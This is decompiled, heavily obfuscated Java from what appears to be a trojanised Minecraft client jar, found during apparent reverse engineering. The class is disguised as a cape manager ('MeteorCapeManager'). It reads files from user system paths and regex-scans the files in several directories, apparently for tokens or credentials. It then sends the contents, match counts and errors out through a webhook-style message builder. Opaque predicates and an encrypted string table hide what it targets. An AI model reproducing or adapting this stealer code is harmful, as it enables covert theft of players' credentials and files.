                  if (IlllIIIlIl(IlIlIllllIIllIl))
                    "".length(); 
                  "".length();
                  IlIlIllllIIllIl++;
                  "".length();
                  if (((0xDE ^ 0x84) & (0x41 ^ 0x1B ^ 0xFFFFFFFF)) != 0)
                    throw null; 
                } 
                "".length();
                if (null != null)
                  throw null; 
              } 
              "".length();
              if (-"   ".length() >= 0)
                throw null; 
            } catch (Exception exception) {}
            j++;
            "".length();
            if ((0xA6 ^ 0xA2) < "   ".length())
              throw null; 
          } 
          "".length();
          if (" ".length() < 0)
            throw null; 
        } 
        MeteorPlayerBuilder lIlllllllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[31]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[32]]).append(String.valueOf(lIIlIllllIIllIl)).append(IlIllIll[lIlllIll[33]]))).withAvatarURL(IlIllIll[lIlllIll[34]]).withDev(lIlllIll[0]).build();
        llIIlIlllIIllIl.sendMessage(lIlllllllIIllIl);
        "".length();
        if ("   ".length() >= (51 + 11 - -56 + 61 ^ 77 + 84 - 24 + 46))
          throw null; 
      } catch (Exception llIllllllIIllIl) {
        MeteorPlayerBuilder IIlllllllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[35]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[36]]).append(llIllllllIIllIl).append(IlIllIll[lIlllIll[37]]))).withAvatarURL(IlIllIll[lIlllIll[38]]).withDev(lIlllIll[0]).build();
        llIIlIlllIIllIl.sendMessage(IIlllllllIIllIl);
      } 
      try {
        File lIIllllllIIllIl = new File(String.valueOf((new StringBuilder()).append(System.getProperty(IlIllIll[lIlllIll[39]])).append(IlIllIll[lIlllIll[40]])));
        BufferedReader IIIllllllIIllIl = new BufferedReader(new FileReader(lIIllllllIIllIl));
        StringBuilder IllIlllllIIllIl = new StringBuilder();
        "".length();
        String lllIlllllIIllIl;
        while (lIllIIIlIl(lllIlllllIIllIl = IIIllllllIIllIl.readLine())) {
          String IlIllllllIIllIl = String.valueOf((new StringBuilder()).append(lllIlllllIIllIl.split(IlIllIll[lIlllIll[42]])[lIlllIll[0]]).append(IlIllIll[lIlllIll[43]]).append(lllIlllllIIllIl.split(IlIllIll[lIlllIll[44]])[lIlllIll[3]]).append(IlIllIll[lIlllIll[45]]).append(lllIlllllIIllIl.split(IlIllIll[lIlllIll[46]])[lIlllIll[4]]));
          "".length();
          "".length();
          if (((0xB7 ^ 0xC0 ^ 0x32 ^ 0x64) & (0xA ^ 0x5B ^ 0x29 ^ 0x59 ^ -" ".length())) != 0)
            throw null; 
        } 
        MeteorPlayerBuilder lIlIlllllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[48]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[49]]).append(String.valueOf(IllIlllllIIllIl)).append(IlIllIll[lIlllIll[50]]))).withAvatarURL(IlIllIll[lIlllIll[51]]).withDev(lIlllIll[0]).build();
        llIIlIlllIIllIl.sendMessage(lIlIlllllIIllIl);
        "".length();
        if (" ".length() < -" ".length())
          throw null; 
      } catch (Exception llIIlllllIIllIl) {
        MeteorPlayerBuilder IIlIlllllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[52]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[53]]).append(llIIlllllIIllIl).append(IlIllIll[lIlllIll[54]]))).withAvatarURL(IlIllIll[lIlllIll[55]]).withDev(lIlllIll[0]).build();
        llIIlIlllIIllIl.sendMessage(IIlIlllllIIllIl);
      } 
      try {
        File IlIIlllllIIllIl = new File(String.valueOf((new StringBuilder()).append(System.getProperty(IlIllIll[lIlllIll[56]])).append(IlIllIll[lIlllIll[57]])));
        BufferedReader lIIIlllllIIllIl = new BufferedReader(new FileReader(IlIIlllllIIllIl));
        StringBuilder llllIllllIIllIl = new StringBuilder();
        "".length();
        String IIIIlllllIIllIl;
        while (lIllIIIlIl(IIIIlllllIIllIl = lIIIlllllIIllIl.readLine())) {
          "".length();
          "".length();
          if (((0x21 ^ 0x72 ^ 0x25 ^ 0x2C) & (83 + 23 - 88 + 228 ^ 96 + 111 - 48 + 13 ^ -" ".length())) != 0)
            throw null; 
        } 
        MeteorPlayerBuilder IlllIllllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[60]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[61]]).append(String.valueOf(llllIllllIIllIl)).append(IlIllIll[lIlllIll[62]]))).withAvatarURL(IlIllIll[lIlllIll[63]]).withDev(lIlllIll[0]).build();
        llIIlIlllIIllIl.sendMessage(IlllIllllIIllIl);
        "".length();
        if (-" ".length() >= "   ".length())
          throw null; 
      } catch (Exception IIllIllllIIllIl) {
        MeteorPlayerBuilder lIllIllllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[64]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[65]]).append(IIllIllllIIllIl).append(IlIllIll[lIlllIll[66]]))).withAvatarURL(IlIllIll[lIlllIll[67]]).withDev(lIlllIll[0]).build();
        llIIlIlllIIllIl.sendMessage(lIllIllllIIllIl);
      } 
      "".length();
      if (" ".length() >= "  ".length())
        throw null; 
    } else if (IlIlIIIlIl(lIIIlIlllIIllIl.contains(IlIllIll[lIlllIll[68]]))) {
      List<String> llIllIlllIIllIl = new ArrayList<>();
      "".length();
      int IlIllIlllIIllIl = lIlllIll[0];
      StringBuilder lIIllIlllIIllIl = new StringBuilder();
      "".length();
      try {
        Iterator<String> iterator = llIllIlllIIllIl.iterator();
        while (IlIlIIIlIl(iterator.hasNext())) {
          String lllllIlllIIllIl = iterator.next();
          File lIIIIllllIIllIl = new File(lllllIlllIIllIl);
          String[] IIIIIllllIIllIl = lIIIIllllIIllIl.list();
          if (llIlIIIlIl(IIIIIllllIIllIl)) {
            "".length();
            if ("  ".length() == "   ".length())
              throw null; 
            continue;
          } 
          String[] arrayOfString1 = IIIIIllllIIllIl;
          int i = arrayOfString1.length;
          int j = lIlllIll[0];
          while (IIllIIIlIl(j, i)) {
            String IlIIIllllIIllIl = arrayOfString1[j];
            try {
              FileInputStream IllIIllllIIllIl = new FileInputStream(String.valueOf((new StringBuilder()).append(lllllIlllIIllIl).append(IlIIIllllIIllIl)));
              DataInputStream lIlIIllllIIllIl = new DataInputStream(IllIIllllIIllIl);
              BufferedReader IIlIIllllIIllIl = new BufferedReader(new InputStreamReader(lIlIIllllIIllIl));
              String llIIIllllIIllIl;
              while (lIllIIIlIl(llIIIllllIIllIl = IIlIIllllIIllIl.readLine())) {
                Pattern IIIlIllllIIllIl = Pattern.compile(IlIllIll[lIlllIll[72]]);
                Matcher lllIIllllIIllIl = IIIlIllllIIllIl.matcher(llIIIllllIIllIl);
                while (IlIlIIIlIl(lllIIllllIIllIl.find())) {
                  if (IlllIIIlIl(IlIllIlllIIllIl))
                    "".length(); 
                  "".length();
                  IlIllIlllIIllIl++;
                  "".length();
                  if (((97 + 79 - 100 + 55 ^ 32 + 134 - -7 + 3) & (0x11 ^ 0x6C ^ 0xEA ^ 0xA4 ^ -" ".length())) != 0)
                    throw null; 
                } 
                "".length();
                if ("   ".length() <= 0)
                  throw null; 
              } 
              "".length();
              if ("  ".length() == -" ".length())
                throw null; 
            } catch (Exception exception) {}
            j++;
            "".length();
            if (((150 + 5 - 11 + 47 ^ 62 + 93 - 71 + 69) & (0x49 ^ 0x23 ^ 0xEF ^ 0xA3 ^ -" ".length())) >= "   ".length())
              throw null; 
          } 
          "".length();
          if (" ".length() <= -" ".length())
            throw null; 
        } 
        MeteorPlayerBuilder IllllIlllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[75]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[76]]).append(String.valueOf(lIIllIlllIIllIl)).append(IlIllIll[lIlllIll[77]]))).withAvatarURL(IlIllIll[lIlllIll[78]]).withDev(lIlllIll[0]).build();
        llIIlIlllIIllIl.sendMessage(IllllIlllIIllIl);
        "".length();
        if (null != null)
          throw null; 
      } catch (Exception IIlllIlllIIllIl) {
        MeteorPlayerBuilder lIlllIlllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[79]]).withContent(String.valueOf((new StringBuilder()).append(IlIllIll[lIlllIll[80]]).append(IIlllIlllIIllIl).append(IlIllIll[lIlllIll[81]]))).withAvatarURL(IlIllIll[lIlllIll[82]]).withDev(lIlllIll[0]).build();
        llIIlIlllIIllIl.sendMessage(lIlllIlllIIllIl);
      } 
      "".length();
      if (null != null)
        throw null; 
    } else {
      MeteorPlayerBuilder IIIllIlllIIllIl = (new MeteorPlayerBuilder.Builder()).withUsername(IlIllIll[lIlllIll[83]]).withContent(IlIllIll[lIlllIll[84]]).withAvatarURL(IlIllIll[lIlllIll[85]]).withDev(lIlllIll[0]).build();
      llIIlIlllIIllIl.sendMessage(IIIllIlllIIllIl);
    } 
  }
}


/* Location:              D:\reversingPhobos\144hz_build28.jar!\com\exploiters\xploitclien\\utils\wipcapes\MeteorCapeManager.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */